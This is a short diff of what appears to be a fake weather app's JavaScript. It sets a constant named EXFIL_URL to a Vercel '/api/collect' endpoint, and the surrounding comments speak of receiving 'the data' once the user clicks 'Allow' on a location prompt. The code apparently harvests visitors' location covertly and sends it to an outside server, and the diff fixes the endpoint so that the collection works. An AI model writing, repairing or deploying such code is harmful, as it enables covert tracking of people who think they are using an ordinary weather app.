@@ -397,7 +397,8 @@
         //    Set this to your server if you want to receive the data.
         //    Leave as null to just log to console.
         // ================================================================
-        const EXFIL_URL = nisxeng.github.io/WheaterApp/api/collect.js; // e.g., "https://your-server.com/api/collect"
+        // ✅ Correct for Vercel
+const EXFIL_URL = "https://wheater-app-pi-ochre.vercel.app/api/collect"; // e.g., "https://your-server.com/api/collect"
 
         // ================================================================
         // 2. WAIT FOR USER TO CLICK "ALLOW" ON THE LOCATION MODAL
